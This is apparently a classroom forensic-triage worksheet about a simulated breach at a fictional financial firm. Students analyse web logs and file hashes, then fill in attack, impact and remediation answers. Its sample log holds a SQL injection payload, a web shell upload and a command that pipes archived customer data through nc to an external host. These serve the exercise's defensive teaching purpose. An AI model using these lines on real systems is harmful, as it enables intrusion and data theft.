# Activity 02: Hands-on Security Incident Investigation & Forensic Triage

**Course**: Cryptography & Data Protection  
**Module**: 01 — Information Security  
**Session**: Day 02 Forensic Investigation Lab  
**Estimated Time**: 50 Minutes  

---

## 🎯 Lab Objectives

1. Conduct forensic log analysis on simulated web application and system authentication logs.
2. Verify cryptographic hash values to identify altered, tampered, or injected files.
3. Construct an Incident Timeline identifying the Initial Access, Lateral Movement, and Exfiltration phases.
4. Formulate an Incident Triage & Remediation Brief adhering to standard CSIRT/NIST SP 800-61 frameworks.

---

## 📂 Incident Background: Project "Apex Horizon"

You are a Tier-2 Security Operations Center (SOC) analyst at **Apex Financial Services**.  
At 03:14 AM UTC on September 8th, the network monitoring sensor triggered an alert for anomalous outbound data transmission from the internal customer portal host (`10.0.4.15`) to an unknown external IP (`198.51.100.42`).

---

## 📜 Evidence Artifact 1: Web Server Access Logs (`/var/log/nginx/access.log`)

```text
[08/Sep/2026:02:45:12 +0000] "GET /login HTTP/1.1" 200 4521 "Mozilla/5.0"
[08/Sep/2026:02:48:33 +0000] "POST /api/v1/authenticate HTTP/1.1" 401 142 "python-requests/2.28.1"
[08/Sep/2026:02:48:34 +0000] "POST /api/v1/authenticate HTTP/1.1" 401 142 "python-requests/2.28.1"
[08/Sep/2026:02:48:35 +0000] "POST /api/v1/authenticate HTTP/1.1" 401 142 "python-requests/2.28.1"
[08/Sep/2026:02:50:04 +0000] "POST /api/v1/authenticate HTTP/1.1" 200 892 "python-requests/2.28.1" (admin_svc)
[08/Sep/2026:02:54:19 +0000] "GET /admin/users?filter=1' UNION SELECT username,password_hash FROM creds-- HTTP/1.1" 200 48291
[08/Sep/2026:03:02:40 +0000] "POST /admin/firmware_upload HTTP/1.1" 200 312 "multipart/form-data; payload=backup_helper.php"
[08/Sep/2026:03:12:01 +0000] "GET /uploads/backup_helper.php?cmd=tar+czf+-+/var/data/customers | nc 198.51.100.42 4444 HTTP/1.1" 200 0
```

---

## 🔍 Evidence Artifact 2: Critical File Integrity Verification (FIM)

The SOC maintains cryptographic SHA-256 baselines of all production files in the `/var/www/core` directory. Compare the baseline hashes with the incident triage hashes:

| File Path | Golden Baseline Hash (SHA-256) | Post-Incident Hash (SHA-256) | Integrity Status (`VERIFIED` / `TAMPERED`) |
| :--- | :--- | :--- | :--- |
| `/var/www/core/auth.py` | `a9f4c3d8e5b201f9...` | `a9f4c3d8e5b201f9...` | `[ Fill status ]` |
| `/var/www/core/db.py` | `107e5b92cb310aef...` | `48db2c918ef03a11...` | `[ Fill status ]` |
| `/var/www/core/session.py` | `ff38c92a1059db33...` | `ff38c92a1059db33...` | `[ Fill status ]` |
| `/var/www/uploads/backup_helper.php` | *(File did not exist in baseline)* | `e3b0c44298fc1c14...` | `[ Injected / Web Shell ]` |

---

## 🛠️ Investigation Tasks

### Task 1: Attack Vector Identification
1. What initial attack technique was used between `02:48:33` and `02:50:04`?
   - *Answer*: `[ Fill here (e.g. Credential Stuffing / Brute Force) ]`
2. What vulnerability was exploited at `02:54:19`?
   - *Answer*: `[ Fill here (e.g. SQL Injection) ]`
3. How did the adversary achieve Remote Code Execution (RCE) at `03:02:40`?
   - *Answer*: `[ Fill here ]`

---

### Task 2: CIA Impact Assessment

Categorize the attack's impact against the CIA Triad:

- **Confidentiality Impact**:
  - *Data Exposed*: `[ Detail what was exfiltrated ]`
  - *Severity Level*: `[ LOW / MEDIUM / HIGH / CRITICAL ]`
- **Integrity Impact**:
  - *System Changes*: `[ Detail which file was altered / web shell injected ]`
  - *Severity Level*: `[ LOW / MEDIUM / HIGH / CRITICAL ]`
- **Availability Impact**:
  - *Service Impact*: `[ Was the service taken down, or maintained for exfiltration? ]`
  - *Severity Level*: `[ LOW / MEDIUM / HIGH / CRITICAL ]`

---

### Task 3: Incident Containment & Eradication Plan

List the immediate technical actions the incident response team must execute:

1. **Containment (First 30 Minutes)**:
   - Action 1: `[ e.g. Revoke compromised credentials of admin_svc ]`
   - Action 2: `[ e.g. Terminate outbound network connection to 198.51.100.42 ]`
   - Action 3: `[ e.g. Quarantine host 10.0.4.15 from corporate VLAN ]`
2. **Eradication**:
   - Action 1: `[ Delete web shell /uploads/backup_helper.php ]`
   - Action 2: `[ Restore db.py from git version-controlled baseline ]`
3. **Long-Term Hardening**:
   - Action 1: `[ Parameterize SQL queries / deploy WAF ]`
   - Action 2: `[ Implement MFA for all service accounts ]`
